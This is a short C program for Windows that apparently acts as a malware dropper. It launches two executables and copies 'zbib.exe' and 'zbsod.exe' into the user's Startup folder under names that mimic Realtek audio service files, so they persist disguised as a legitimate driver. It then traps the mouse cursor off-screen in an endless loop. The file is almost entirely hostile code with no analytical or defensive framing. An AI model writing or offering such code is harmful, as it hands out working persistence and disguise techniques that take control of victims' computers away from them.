#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int main()
{    
    system("start zbib.exe");
    system("start RtkAudUServiceUpd64.exe");
    
    system("copy zbib.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"");
    system("copy zbsod.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"");
    

    while (1)
    {
        SetCursorPos(2000, 2000);
    }
    
    
	return 0;
}